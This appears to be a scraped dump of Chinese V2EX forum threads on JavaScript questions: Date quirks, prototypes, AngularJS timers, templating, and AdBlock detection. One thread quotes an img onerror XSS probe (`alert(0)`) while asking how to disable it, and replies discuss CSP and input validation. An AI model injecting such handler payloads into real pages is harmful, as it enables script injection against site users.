"知道了这个新的网站，不错~感谢~"]},
{"content": ["<div class=\"topic_content\">Date.parse('2014-07-16 16:12:30')返回直为1405498350000<br>Date.UTC(2014,7,15, 16,33,43)返回直为1408120423000<br>这2个数值之间相差728个小时，觉得也不是因为时区的问题把。不明白。</div>"], "reply": "6", "tittle": "问个关于 js 里面的 Date 解析问题", "comment": ["因为你用 2014,7,15 这种格式传值的时候，月份是从0开始数的。\r", "所以实际上这是8月15日了。", "差了一个月，经典的坑。专门用来坑新手的。", "你如果要问为什么JS这么坑，其实是因为JS诞生的时候直接照搬了Java 1.0的Date对象。\r", "所以 Java 1.0 的 Date 为什么是这样的呢？是因为 Java 1.0 遵循了一份老旧的 C 语言的标准（the old standard (POSIX) localtime C function ", "\r", "\r", "这个坑的由来和 JS 的 NaN 坑是多么的类似啊，啊哈哈。", "这个问题的标准回答可以套用典型的 RTFM 了", "学习了。", "可以考虑用momentjs处理时间"]},
{"content": ["<div class=\"topic_content\">&lt;html&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;<br><br>&lt;img src='http://rrrrr' onerror=\"alert(0);\"&gt;<br><br>img加载出错时会执行onerror后面的语句，如何在不改变<br><br>&lt;img src='http://rrrrr' onerror=\"alert(0);\"&gt;的情况下在前面加js将这个事件禁用掉？</div>"], "reply": "6", "tittle": "如何禁用 img onerror 事件？", "comment": ["这个需求很奇怪……你是怕网站被 xss 所以才这么做的么？\r", "或许你可以选择用 js 清空掉所有的 onerror 属性，\r", "或者尝试清除这个事件的监听？", "CSP倒是可以废掉所有的inline script~", "估计是写浏览器脚本（油猴、UC之类），之前我都有这需求", "根本问题是要杜绝XSS入口。对于LZ的问题，所有外部输入的URL，都先判断下是否是一个合法的地址应该就能达到预期的目的了。", "XSS的可以看下那几篇神文", "重写 Element 对象的 prototype。。。"]},
{"content": ["<div class=\"topic_content\">&gt;a=[1,2,3]<br>[1, 2, 3]<br>&gt;a.x=2<br>2<br>&gt;a.x<br>2<br>&gt;b=1<br>1<br>&gt;b.x=2<br>2<br>&gt;b.x<br>undefined<br>============================================<br>这里为什么a.x可以赋值，b.x确不行呢？</div>"], "reply": "14", "tittle": "初学 js，有个问题请教", "comment": ["数组也是对象，所以可以有自己的属性，而 b 是一个数值，虽然在Javascript中也算是对象，但是事实上和数值对象是不同的，通过 b = new Number(2) 可以得到一个数值对象，此时 b.x 是存在的", "通过 typeof 就可以发现两个 b 的不同", "针对楼上的回答补充一下，b不属于复杂对象，不能在上面定义方法；但b.toString()是可以正常使用的，js会在后台临时创建一个包装对象，toString()就是在此对象上调用，调用结束后该对象会被销毁。", "理解JS的基本数据类型的包装对象这个概念就能明白了。String和Boolean对象也是如此。", "所以给b.x＝2这里其实赋值成功了，但这是赋值在包装对象上，这个对象随后就被销毁了。", "短答案：因为 a 是对象，b 不是对象，只是一个整数\r", "长答案：\r", "1. 从JS的语法的角度来看，「.」操作符的左边应该只能是一个对象（即 object.key 这种形式）\r", "2. 为什么 JS 的 number 也可以接上一个「.」操作符呢？因为 JS 的作者本着「以人为本」的理念，在开发者写出\r", "number.toString()\r", "如上代码的时候，贴心地生成一个和 number 相对应的 Number 对象（临时对象）。\r", "当这句话执行完了，这个临时的 Number 对象也就消失了。\r", "这样，开发者即可以接触简洁的代码，又能享受面向对象带来的方便。\r", "3. 所以，你在写 b.x=2 的时候，其实是把 2 赋值给了临时对象的 x 成员。这句话结束后，b 还是那个整数 b，而不是那个临时对象。 \r", "4. 你在写 a.x=2 的时候，就没有临时对象了，2 是直接复制给了 a.x。", "纠正：「可以接触简洁的代码」->「可以写出简洁的代码」", "一点进来发现都被答完了=_=", "推荐那本海龟书，编写可维护的JavaScript，里面有详细的讲解", "这种情况总得来说就是创建完就会消失", "感谢楼上各位了，我知道怎么回事了！", "《JavaScript 高级程序设计》第三版的5.6节「基本包装类型」里对这个也有比较详细的解释。楼主的代码可以看成是下面这样的。\r", "var b = new Number(1);\r", "b.x = 2;\r", "b = null;\r", "\r", "-----------------------------------------\r", "引用类型与基本包装类型的主要区别就是对象的生存期。", "原始值和复杂值的问题。LZ 可以看下 *JavaScript Enligbtenment* 这本书第一章的内容。", "V2果然大神多啊"]},
{"content": ["<div class=\"topic_content\">最近在网上找了些资源在看, 这个有前辈给些学习的经验么?<br>需要注意些什么?<br>看书更好么???</div>"], "reply": "34", "tittle": "最近想学习 js....问些问题...", "comment": ["\r", "以及 ", " 谢谢!!!", "感觉那本高级程序设计入门挺好的。", "MDN和YDN", " 恩恩...", "强推「JavaScript 语言精粹」", " 谢谢~!", " 谢谢,那本书买了,预计明天就到了~~不知道适合初学看不...", " 适合有一定经验的JavaScript 开发者\r", "如果是新手的话，《JavaScript DOM 编程艺术》培养兴趣，《JavaScript 高级程序设计》入门。然后应该就明白后续路线了", " \r", "没一点基础的初学者么？\r", "先看w3cshool的教程撸一遍，然后看书，\r", "不看犀牛书怎么看得懂蝴蝶书", "javascript: good parts", " 阮一峰的东西总是能给人一种柳暗花明的感觉", "先看看语法，再看看dom，自己写个jquery，不懂得google。话说学学node，进步神速啊", "语法，犀牛书；dom，  highlight dom；jquery，源码；node，in action。\r", "github才是你的家啊 孩纸", " 最近刚好准备开始整理下之前学过程中的东西，到时候给你看看。", " 迫不及待.^.^", " 呃..基础的话还是有一些的...", "  谢谢.!", " 谢谢.我也觉得github才是家....不过没太搞明白= =#", "基本的会了之后 写一阵子就熟悉了...", "如果对 JavaScript 还没什么概念的话，建议先看看 《JavaScript DOM 编程艺术》。这个楼上有人指出了。新手看这个不会觉得太枯燥。\r", "\r", "看完之后如果觉得想深入了解的话，再看 《JavaScript 高级程序设计》 或者 《JavaScript 权威指南》 。这两本可谓是必读的。如果你是想深入了解这门语言的话。\r", "\r", "这两本书厚度都不小，如何正确的看书学习还是个问题。我个人推荐按照 ", " 这个步骤学。我就是按照里面的步骤学的。只不过学习的周期我自己控制。\r", "\r", "上面的这个教程真的挺好的，至少我是这么认为。整个学习过程其实都可以参照上面的这个连接的教程。\r", "\r", "JavaScript 这门语言比较容易使新手困惑的有 闭包，IIFE，回调函数，隐式类型转换，声明提升，作用域，原型，原型链，构造函数，以及对 this 的理解 等。应该还有其他的。楼下的麻烦补充。楼主等你学完语法，有几个练手作品之后，就可以去学学 jQuery 了。学 jQuery 看 《锋利的 jQuery 》。这本书虽然旧了点，但是很通俗易懂，很容易上手。然后边学 jQuery 边理解我刚刚说的这些容易让新手困惑的东西。以及看一些经典书籍，比如《编写可维护的JavaScript》、《高性能JavaScript》、《JavaScript模式》等。可以参考 ", " 。学完 jQuery 之后可以尝试着写一个 jQuery 插件。不用太复杂，但是至少要有意思。\r", "\r", "等你看完这些书，对这些基础知识有所了解之后，就可以了解一下 JavaScript 的设计模式，以及学会使用 MVC 等框架。学完 MVC 框架之后，再学一门后端语言吧。\r", "\r", "\r", "\r", "在学习的过程中遇到问题了，我建议先自己认认真真的排错，等到实在是研究不出原因，再 Google 搜索一下。一般来说，比较常见的问题都能通过搜索引擎得到答案。因此我也希望你在学习的过程中，多利用网络资源，而不是遇到问题就向别人提问。因为这样对你以后的学习会有很大影响的。自己动手解决问题印象才会深刻。\r", "\r", "最后，有兴趣的话还是学学 Node.js 吧。它对 JavaScript 的学习也有很大的积极作用。至少对于我来说是这样。\r", "\r", "嗯。以上。共勉。", "才发现其实自己现在学得挺乱的。o(︶︿︶)o 唉。", " 谢谢你! 辛苦了. 共勉!", "做个记号 最近在学 android\r", "javascript 只看完了《JavaScript DOM 编程艺术》\r", "买了 《JavaScript 高级程序设计》 \r", "回头看，谁知道怎么学 jQuery ？", "javascript 权威指南，javascript高级程序设计，高性能javascript，javascript设计模式，依次 循序渐进", "DOM Scripting: Web Design with JavaScript and the Document Object Model", " 直接用，然后不会查ｗ３ｃ，貌似有本叫jquery实战的书很不错", " 这位兄弟的学习路线和思路很受用", "对于刚刚开始学习的,我也推荐10楼 @", " 推荐的w3cschool的教程\r", "而不是直接上高级程序设计等书.\r", "不知道楼主对HTML熟悉不熟悉,如果HTML不熟的话,顺便也在w3cschool学习一下HTML和css", "\r", "这条路感觉蛮靠谱。如果有编程基础+懂一点HTML/CSS，直接看JavaScript高级程序设计就OK了，完全够的。犀牛书貌似枯燥点。", "一本悟透javascript就够了，看完这个，估计你就想再去学点别人语言了", "先了解一下javascrpit 和java, 再追溯一下javascript 的历史,了解一下ECMAScript,ECMAScript 原始类型,ECMAScript 引用类型. 还有就是装一个能够智能提示的JavaScript的ide. 自己动手敲代码。", "没学过编程至少需要3本书，一本侧重编程思想的，eloquent javascript，一本侧重语言细节的，javascript权威指南\r", "，一本侧重实际开发质量的 ，javascript语言精粹。我也是新手，3本结合看感觉很好"]},
{"content": ["<div class=\"topic_content\">最新在做公司的一个项目，需要实现一个敲打代码的动画效果，粗意味比较简单，果断自己直接开写，写着写着发现是一个坑。需要支持语法高亮，并不能直接简单的用setTimeout来动态附件innerHTML。苦思猛想数小时后，果断用动态生成DOM的方法实现了整个效果。<br><br>typing.js的打印效果甚至能够支持表格、按钮、表单，只要你页面能够呈现出来的，都可以以一种动态输出的感觉打印出来！ 强烈推荐观看完整DEMO<br><br>我在网上查了一下，应该目前是没有一个插件是和typing.js效果一致的！<br><br>在优化代码后，已经放在github上，并建立了相关项目页面。<br>项目主页： [typing.js](http://coffeedeveloper.github.io/typing.js/)<br>完整DEMO：[demo](http://coffeedeveloper.github.io/typing.js/demo.html)<br>带闪烁效果的代码书写DEMO：[demo2](http://coffeedeveloper.github.io/typing.js/demo2.html)<br><br>如果你觉得这个插件有意思的话。可以在github项目上star一个，对我是莫大的鼓励与帮助！</div>"], "reply": "22", "tittle": "最牛的打字效果 JS 插件 typing.js", "comment": ["画面太美不敢用啊。", "这个东西的应用场景是什么呢？", " 装逼神器啊！！", " Presentation特效.", "轻轻地Star了一下", "曾经在某编程教学的网站上看到过，我尝试做过，想模拟键盘事件，但是貌似js没有那样的接口", " 比如说某黑客黑掉别人网站，然后用这个显示\"hacked by xxx\"不觉得炫酷狂霸拽嘛？", "好东西，收藏", "00年代刚上网那会儿经常见到这种typing效果", "准备把demo2的特效给我的\r", "\r", "加上", "不过闪烁光标的样式还是喜欢我目前的下划线那样。", " 神域名！", " 大哥你的个性域名真多", "效果不错！支持！", "好像可以装逼的样子~", "os.io 你的域名吗？", "00年代刚上网那会儿经常见到这种typing效果 +1", "“最牛”算是标题党？\r", "另附一个typer lib\r", " 那绝对是的！", "不错", "Mark一个。顺便来围观域名。", "给个建议啊，现在字是按固定间隔出现的，感觉很生硬，不像是人打字。同事做过个类似项目用的是 perlin noise 来产生随机但顺滑的打字间隔。"]},
{"content": ["<div class=\"topic_content\">比如：<br>&gt;function I(){this.func=function(){return this}}<br>undefined<br>&gt;I.prototype={func2:function(){return this}}<br>Object {func2: function}<br>&gt;a=new I()<br>I {func: function, func2: function}<br>&gt;a.func()<br>I {func: function, func2: function}<br>&gt;a.func2()<br>I {func: function, func2: function}<br>----------------------------------------------------<br>这里的话，方法定义在I里面和prototype里会有什么区别呢？</div>"], "reply": "9", "tittle": "在构造函数 c 里面定义函数和在 c.prototype 里面定义有什么区别？", "comment": ["定义在 i 里，new 的时候，每个实例都会有，占用内存多，放在原型里，所有实例都只用一个引用。", " 也就是说，除了占内存之外别的区别没有吗？", "一种叫特权方法，一种叫公有方法", " 但是有什么区别呢？", " 你为什么要问不同的东西有什么区别 =。=", " 就是，方法x定义在prototype里和定义在构造函数里，a=new XX(),a.x()效果不是一样吗？", " 一楼说了，this方法是每个实例都会生成，而prototype里的方法是会共享的。", "假设构造函数里定义的方法是fn，这个方法在以new调用构造函数时是直接赋值在实例上的，每调用一次构造函数就生成一次新的fn，也就是说生成1000个实例就会生成1000次这个函数。\r", "\r", "另外构造函数里定义的属性和方法是会覆盖prototype上的同名属性（方法）的。\r", "\r", "所以楼主问题的答案是：\r", "1：内存占用有区别，构造函数上的方法会重复调用，prototype上的方法会在实例生成时自动继承；\r", "2：优先级有区别，构造函数上的属性（方法）会覆盖prototype上的属性（方法）。", " 太赞了，要的就是这个答案"]},
{"content": ["<div class=\"topic_content\">有一种情景，我要隔一段时间取数据，然后我离开这个controller，发现还会不断地取。<br><br>.....</div>", "<div class=\"topic_content\">var promise = $interval(function(){<br>            console.log(123);<br>        },3000);<br>        $scope.$on('$destroy',function(){<br>            $interval.cancel(promise);<br>        })<br><br>这样简单环保，感谢@<a href=\"/member/Anran\">Anran</a></div>"], "reply": "10", "tittle": "Angular 计时器的问题。", "comment": ["可以在路由切换结束的时候清掉吗？\r", "\r", "我已经不用这种方法，让用户 自己点击的时候获取算了。但是想知道怎么解决这个。", "我以前做法是专门做一个单例 Daemon 来处理所有定时请求，暴露 register 和 unregister 接口给 controller，controller 销毁时 unregister 掉。", "我前段时间用Angular写过些代码，感觉封装太深了，还是Backbone + marionette灵活些。", " 上伪代码?\r", "\r", " 做后台管理系统，感觉Angular还是有优点。", "监听routeChangeStart?然后里面把timeout cancel掉？", " 我只是这样想，不知道能不能。", "如果是这样，变量要挂$rootScope了？\r", " 很简单啊，还要伪代码。daemon 内部有一个 {} 去记录定时任务的参数、回调。 register 写入这个{}，返回 {} 的 key 作为 handler；unregister 时传 handler 进去，delete [handler]；\r", "\r", "另外我还有一个 update 方法去更新定时任务的参数。\r", "\r", "daemon 内部有一个 loop，每次用 setTimeout 触发启动，loop 中按照每个定时任务的参数执行，并执行回调函数。", "使用自带的 $timeout, 然后监听 $destroy 事件  \r", " 不错。如果有需要就用这种"]},
{"content": ["<div class=\"topic_content\">支持原生 js 与 Angular.js，直接在前端上传图片到又拍云 bucket 的工具。<br><br><a target=\"_blank\" href=\"http://ww3.sinaimg.cn/mw690/61ff0de3gw1eiuuyjg9tjj20hl0lydig.jpg\"><img src=\"http://ww3.sinaimg.cn/mw690/61ff0de3gw1eiuuyjg9tjj20hl0lydig.jpg\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"></a><br><br>可以到这里体验上传效果：<br><a target=\"_blank\" href=\"http://turingou.github.io/upyun/\" rel=\"nofollow\">http://turingou.github.io/upyun/</a><br><a target=\"_blank\" href=\"http://turingou.github.io/upyun/angular.html\" rel=\"nofollow\">http://turingou.github.io/upyun/angular.html</a><br><br>演示仓库有 800MB 的空间限制，每天清空，仅用于演示~<br><br>安装：<br>$ bower install upyun --save<br>或<br>$ npm install upyun-form --save<br><br>欢迎 star &amp; fork:<br><a target=\"_blank\" href=\"https://github.com/turingou/upyun\" rel=\"nofollow\">https://github.com/turingou/upyun</a><br><br>PS：前端配置 token 会直接暴露 api_secret ，如需使用建议开启防盗链。</div>"], "reply": "1", "tittle": "upyun form uploader 又拍云表单上传工具", "comment": ["Cool!"]},
{"content": ["<div class=\"topic_content\">最近写个前端界面<br><br>要用js来动态添加input<br><br>发现写长了就乱了 改起来也麻烦<br><br>大家一般用什么方法？</div>"], "reply": "23", "tittle": "js 如何优雅的拼接 字符串", "comment": ["不是有个handlebars模板引擎吗", "现在看到如何优雅的XXX就觉得恶心，这是病么？\r", "PS：如果字符串过长，直接把模板写到HTML的script标签里面，属性设置为\"text/template\"，然后直接用jQuery的html()方法取字符串，如果涉及到模板变量、逻辑语句的话就换underscore试试，", "dom最优雅", "var cache = [];\r", "cache.push('a');\r", "cache.push('b');\r", "cache.push('c');\r", "var result = cache.join(''); // abc", " 用的django 模板 要冲突了", " underscore 不错", "str = \"Say #{hello}\"\r", "\r", "这种如何？Coffee", "push过时了。。。\r", "\r", "俺用\r", "var str = '\\\r", "<div> \\\r", "</div> \\\r", "';", "可以用模板的话最方便。push 相对「优雅」，但拼字符串可能是最快的。", "看标题还在想加号难道还不够你用么…\r", "\r", "也许你是需要一个模板库…", " 赞恶心优雅的 XXX", "嗯… 之前做过测试，juicer最快。", "你需要这个 ", "handlebars coffee", " 赞+1", "[\r", "  \"<div>\",\r", "    \"<input type='text' />\",\r", "  \" </div>\"\r", "].join('');\r", "看起来还算“优雅”", "这浓浓的知乎风是怎么回事。。", "如果把优雅换成 best practice 大家会不会容易接受点？或者用“地道、接地气”？\r", "\r", "V2EX里出现“优雅”的发问比知乎早很多\r", "\r", "\r", "=====\r", "\r", "Coffee 的内嵌语法无疑是最优美的，拼接的糙活儿都给你做了。\r", "反斜杠只是解决了将一行字符串分成多行，没有解决拼接的问题。\r", "Array.push 方法在语法层面利用数组特性避免了连接符号，但是带来的开销是非常慢（真的非常慢，现代浏览器都会对静态字符串做优化 ", " ）\r", "multiline利用注释和Function.toString做的小把戏，如果有一些预处理（UglifyJS）会影响结果。\r", "\r", "最佳实践都是日常积累而来，如果光问个结论可能不会让自己收获多少，也许这就是人们反感“优雅的XXX”的原因。", "用过mustache，蛮好用的。underscore还躺在starred", " ", " 黑科技~", " 你这个和 sindresorhus 的有什么区别?", " 是他给我灵感, 这个库只能在 Nodejs 下, 而我只是做了 浏览器端和 Nodejs 端的兼容 . 另外尽量简单实用 ."]},
{"content": ["<div class=\"topic_content\">分享吧</div>"], "reply": "11", "tittle": "通过前端 js 直接上传文件到 百度网盘 ,应该有人做过了吧.", "comment": ["伸手伸得毫不犹豫", "既然你都找不到谁做过你问谁要呢？", "不禁感叹一句。。。好屌！", "好赞。", "js能上传文件？！", "高贵冷艳。。。", "伸手党不是这样伸的，伸得好前三楼就给出你所要的了！", "（笑）", "官网有栗子，不知道是不是lz需要的", "分享吧 戳中笑点 2333333", " 看来伸的不好"]},
{"content": ["<div class=\"topic_content\">在controller调用service取到数据。这时只有简单的一些转换，比如把数字转成对应文字说明等。<br>在controller直接一个forEach，然后就到了view渲染，我觉得这样快。<br>如果是给filter，还有另外写filter。还有就是担心的性能</div>"], "reply": "4", "tittle": "Angular 把数据转换都交给 Filter 好还是在 controller 做好？", "comment": ["从 AngularJS 的哲学来说，数据格式的转换是应该交给 filter 的，因为 controller 只应该负责数据的变化", " nice", "简单转换就filter吧, 复杂的用Controller或Service.\r", "filter的话, 每次digest至少执行两次.", " 正确啊。我也是发现才问。在原理上其实交给Controller和Service都是一样的。只是在人为的区分而已。当然Services可以更好地复用。"]},
{"content": "", "reply": "1", "tittle": "有无类似 Datatables 的其他插件推荐？DT 的 api 太糟心了", "comment": ["我也觉得，完全不想看它的Api，刚好之前看他一篇文章，你可以试试里面的说的插件。\r"]},
{"content": ["<div class=\"topic_content\">类似于某些站点上的播放音频下面显示波形图的js库，看起来高大上的。</div>"], "reply": "8", "tittle": "有没有实用的音频波形图处理 js 库", "comment": ["非得放到前端，这是蛋疼么，用js做个傅里叶变换么，不怕浏览器卡死么", "后端计算, 前端显示结果.\r", "波形图 d3 能干不?", " \r", "应该可以，效率上怕浏览器受不了！\r", "另外计算音频到时没找到合适的开源库来着。\r", "还有一点我不知道怎么让后端源源不断返回刷新的数据。\r", "难不成写个死循环的ajax请求？", "以前就是不停间隔调用 ajax，现在你可以用 websocket。", "web audio api 貌似可实现\r", "没做过，大致搜了一下，比如这玩意：\r", "\r", "\r", "演示页面在safari上正常，chrome不行", "\r", "3ks，貌似很强大的样子。\r", "\r", " \r", "兼容性问题严重。\r", "不过搜到一个强悍的系列:\r"]},
{"content": ["<div class=\"topic_content\">比如<br>var a = xxxxxxx;<br>var b = object.a;<br><br>取b出来……<br><br>实际上用点或者方括号来访问的时候，后面跟的都不能是变量，有没有什么方式可以实现？</div>", "<div class=\"topic_content\">好吧，其实方括号是有用的<br><br>object[b]<br><br>其中b可以是一个变量，也可以是一个字符串……</div>"], "reply": "10", "tittle": "怎么样通过一个变量来访问 javascript 对象？", "comment": ["你要找的是eval吗", "谁告诉你方括号里不能放变量的？不然你以为方括号这么设计意义何在？", "var json = {attr1 = 'data1', attr2 = 'data2'};\r", "var param = 'attr1';\r", "console.log(json[param]);", " 犯了个低级错误，之前用方括号里面加引号来着……我错了", "楼主自问自答的精神好伤大家的存在感", " 这种时刻果断自己打自己的脸……", "我还以为是问flash里怎么访问js变量…\r", "\r", "要不然你以为for in要怎样用…", "kok，你又卖萌了", " \r", " 晚上十点多，想事情脑子糊涂了……话说主任你用不着专程过来打脸吧……", "我只是无意间看见了。。"]},
{"content": ["<div class=\"topic_content\">函数参数是函数体，函数返回值是一个函数体，这还好理解，可是还有函数内定义函数，同时调用父函数，我这思路跟不上，这怎么执行，迷糊啊。</div>"], "reply": "7", "tittle": "如何学习 high order function 概念", "comment": ["你的描述和你的问题不是一个。\r", "你的问题如果中文对应的是高阶函数，那你应该搜柯理化。\r", "你描述的问题，函数内再声明函数，我建议去看看闭包。", "函数内定义函数，同时调用父函数\r", "这个跟higher order function的概念貌似没什么关系。", " 柯理化跟高阶函数也不是一样东西。Javascript就支持高阶函数，但是没有柯理化。", " 我对js支持柯理化的记忆来自于， Javascript语言精粹。 如果是我记错了，请指出。", "跑偏了，higher order function＝first class function。", " 我错了，js是可以实现科里化的，虽然不像haskell/ml/scala那样原生支持的", " 李菊福"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://codepen.io/xiaofuai/pen/oqKIA?editors=101\" rel=\"nofollow\">http://codepen.io/xiaofuai/pen/oqKIA?editors=101</a><br>\"term\": 'angry+birds' 换成 \"term\": 'breaking+bad'<br>就不会出问题，感觉是 description 里面的问题, 但是具体是什么原因找不出来了.</div>"], "reply": "4", "tittle": "jser 帮看下，返回的数据哪里出问题了？", "comment": ["第一个description的有这段\"defenses!  \\n\\nThe\",!后面好像跟了两个不占位看不见的字符，所以报错了", "联系苹果吧，夫哥。\r", "ord 226，咱们上哪解决去啊。", " 先用 php 取了，response 里面有 zero-width space, ", " 嗯 是有这个问题 ", " 但是不确定是这个原因照成的"]},
{"content": ["<div class=\"topic_content\">在写angular的时候 要远程请求一个jsonp数据，但是$http.jsonp 只有异步请求，不能改成同步的，导致我 return data 是 undefined。。<br><br>问：有没有办法让jsonp 模拟同步请求的方式。<br>或者有没有 在$http callback return数据，controller 里能等待 callback再渲染 初始化页面。<br><br>T-T 或者有 angularjs 请求 jsonp，文章列表与内页 切换的demo（其实就是类似博客页面）github上面换个好几个关键词搜索都没有找到，请原谅我的伸手！！<br><br>多谢！</div>"], "reply": "11", "tittle": "请教一个关于 angular 关于 jsonp 的问题", "comment": ["不知道我理解的对不对，可以controller里先给页面要铺设的内容定义一个初始化的内容；类似“载入中”，等callback执行完毕，替换掉相应变量即可。", "promise ?", "不是 angular， jsonp 也是异步的，你都用 JS 了习惯异步吧", "在JS里不要想同步。", "要等什么事情完成再渲染初始化页面。\r", "可以在 $routeProvider.when 里面用 reslove", "list page与detail page的切换，我现在做的hybrid app项目里都是把detail page作为一个层覆盖到list page上的，好像没什么难的嘛", " 你理解是对的。都是 2 way binding 的年代，自动就更新了", "promise啊 angular支持的", "angular里的http不支持同步的，要同步可以使用其他ajax类库，或者使用promise", "1. service 获取数据返回promise，在controller里 promise.then(...)\r", "2. 使用 nv-view: resolve - {Object.<string, function>=} - An optional map of dependencies which should be injected into the controller. If any of these dependencies are promises, the router will wait for them all to be resolved or one to be rejected before the controller is instantiated. If all the promises are resolved successfully, the values of the resolved promises are injected and $routeChangeSuccess event is fired. If any of the promises are rejected the $routeChangeError event is fired. \r", "3. 页面加载时先获取数据，然后手动启动bootstrap：\r", "$.get('http://data').done(function() {\r", "    angular.boostrap(element, ['myapp']);\r", "});", "jsonp 不是有success吗？渲染写成handler在这回调不行吗？"]},
{"content": ["<div class=\"topic_content\">代码如下：<br><br>function noop() {<br>\tthis.name = 'this.name'<br>}<br>function _extend(source, obj) {<br>   for (var prop in source) {<br>      if(!obj.prototype[prop]) {<br>          obj.prototype[prop] = source[prop]<br>      }<br>   }<br>    return obj<br>}<br><br>noop.prototype[\"name\"] =  'noop'<br><br>_extend({\"title\":\"sometitle\"}, noop)<br><br>var n = new noop()<br>console.log( noop.name, noop.title, noop.prototype.name,  noop.prototype.title, noop.prototype)<br>console.log( n.name, n.title)<br><br>输出结果如下：<br>noop undefined noop sometitle { name: 'noop', title: 'sometitle' }<br>'name' 'sometitle'<br><br>问题是：<br>为什么noop.name可以取到值，而noop.title无法取到值，而name和title都在noop.prototype中</div>"], "reply": "4", "tittle": "请教一个 javascript extend 问题", "comment": ["上面的function noop的定义是这样的：\r", "function noop (){}\r", "\r", "jsbin在线调试地址:\r", "你取到的 noop.name不是noop.prototype里定义的name\r", "而是function noop() 的名字", "原来如此！\r", "\r", "多谢！", "noop.title 取不到值是因为 \r", "\r", "    noop.prototype === Function"]},
{"content": "", "reply": "39", "tittle": "是否有可能通过 JavaScript 来检测用户浏览器是否安装了 AdBlock？", "comment": ["或许这是一种检测的方式： ", "1、可以通过BOM来检测某些插件，但不是所有浏览器都兼容；\r", "2、可以通过延时检测自己的广告frame是否加载出来。", "可以的吧，用js检查一下有没有被加上 display:none 应该就可以判断有无屏蔽广告的插件", "\r", "让我想起这个论坛，ADB激活时会显示一条banner提示“去广告虽易，做论坛不易，且行且珍惜。”\r", "\r", "可以延时检测广告区域的可见性和尺寸。", " +1.我也是想起这个。", "这里有个检测方法 ", "我的做法是这样的（不用任何js，纯粹用css）\r", "\r", "将广告和另一个层叠加在一起（物理位置重合，z-index调整位置），广告覆盖后面那个层。\r", "\r", "在后面那个层用background绘制一个和广告大小等同的背景图，上面写上替代文字。\r", "\r", "这样就无需任何额外代码，当这个广告被屏蔽的时候，无论是dom被remove掉，或者是dom被设置成displaynone，其底下那个层都会被露出来。\r", "\r", "效果可以参见我的网站 ", " 首页，最下面的横条Adsense广告 。", "记得某H网站你屏蔽它广告它给你强制看凤姐的恐怖的图", "没必要检测，如果广告合格，去申请非侵入式广告白名单\r", "只有静态广告（不含动画、声音之类的内容）\r", "最好只有文字，没有影响注意力的图片\r", "广告布局方式：\r", "广告不应遮盖网页内容（例如要求用户点击按钮关闭广告后才能浏览网页）。\r", "对于以文字阅读为主的网页，为避免影响用户顺利阅读，广告不应放在文字内容中间位置， 而应放在上下方或左右两侧。 同样，显示搜索结果页面时也不应将付费搜索结果与普通的搜索结果混在一起。\r", "广告置于网页主区域上方时不应要求用户向下滚动鼠标。 这样可用的垂直空间距离一般至少为 700 像素，而广告占用高度不应超过其三分之一。 搜索结果页面中的付费结果则允许占用更大空间，但不应多于普通的搜索结果。\r", "置于两侧的广告应留出足够空间用于显示网页的主要区域。 这样可用的水平空间距离一般至少为 1000 像素，而广告占用宽度不应超过其三分之一。\r", "广告应使用\"广告\"或相同的字眼进行明确标识，并通过边框或不同的背景色与网页内容区别开来。\r", "上述有关标识和位置的要求不适用于网页中带有经销商推荐人 ID 的超链接。这类超链接的具体要求如下：\r", "由超链接重定向到目标页面的过程中不允许跳转到其他任何页面。\r", "加入超链接用于变现的文字不超过 2%。\r", "超链接的格式或行为不得异于其他链接。\r", "无论是内容还是位置上，超链接都不得误导他人。", " 啥也没看到，来自uc浏览器", " 原来你是这个站的作者？", "矛：anti-adblock 脚本\r", "盾：油猴脚本 anti-adblock killer", "反正我在v2ex是未启用adb的。。", " UC浏览器可能会中转服务器数据，导致js不执行而看不到\r", "手机浏览器的话用chrome或者safari没问题的。\r", " 是的。", "当然有的\r", "\r", "见这里\r", "\r", "看一下Easylist  这个应该基本都订阅了 ，在里面随便找一个被屏蔽的元素 如.adcontent\r", "\r", "CreateElement  然后检测 offsetHeight\r", "\r", "应该是这样", " 我的blog目前是用的这种的", "|| shExpMatch(url, '", ")\r", "\r", "我这样子的", " 早就关闭中转了，再说不执行js的浏览器是功能机时代的吧，智能机浏览器不执行js，第一次听说…，那我还能用uc上微博和gmail/twitter么", " \r", " ", "试下这个： ", "可以针对abp的规则创建一个符合其匹配url规则的js，页面内假定abp为true，js重写为false", " 可能是因为Google广告被墙了吧，最近我的用户也有人反映这个问题\r", "这个就没办法了……", "昨天刚好Admob提示我禁用Adblock，或者把admob.com排除", "一般像Google Adsense都是远程的js嘛，随便去里面取个函数来判断 typeof xxxxx == 'undefined' 就行了吧", "现在Adblock Plus 出了一个 Adblock Warning Removal List\r", "已经在“过滤规则首选项”里面了，就差启用\r", "加上Anti-adblock Killer基本上都干掉了\r", "\r", "我觉得更好的思路应该是把所有广告都下载下来，执行里面的JS，模拟渲染来骗DOM之类，但在用户屏幕上不展示。现在的直接Blocked by Client实在太简单粗暴", "以后各种Anti Anti Adblock会出现的……", " 可以告诉你们，官方在做，思路是把广告代码放置在独立而不可见的Sandbox中运行", "流量比较小，对于不能屏蔽广告的网站直接无视... 可选替代网站太多了", "wallbase.cc  这个网站上看到过可以检测到", " ", " 好像并未检测, 无论什么浏览器, 是否开启插件, 都有那个 banner.", "虽然技术上可行，但显然网站不能靠广告来营生。\r", "就算都显示广告，各位以为能拿到多少广告费呢？", "弱弱问一句：将网站加到白名单中不点击广告和直接屏蔽广告两者有区别吗？", "实际上,只显示不点击\r", "和盲目的点击,都没有什么广告效果的\r", "\r", "最好的广告是根据用户的习惯,来提供他感兴趣的内容\r", "\r", "例如前几天我需要购买一个海外VPS,也搜索了一些相关的内容,加入这个时候在我比较常去的一个网站看到一个VPS广告,那么我就有很高的可能性去点击查看\r", "\r", "不过总体而言,靠这种广告来实现网站盈利或者说持平几乎也是不可能的事情\r", "\r", "网站的运营应当有更适当的盈利模式,如果你网站做的真的好,一个捐助连接会比广告更有效果...", "adb没有必要，广告影响浏览的网站直接关闭，好网站点广告以示支持！", "楼上的很多人都跑题了好吗? LZ的意思是能否监测出是否安装ADB!", "防站长js检测AdBlock做出相应调整，可在chrome安装Stylish扩展程序，然后写上css\r", "\r", "把广告部分display:none 可死死屏蔽任何网站的任何广告 ！ 效果老好了。"]},
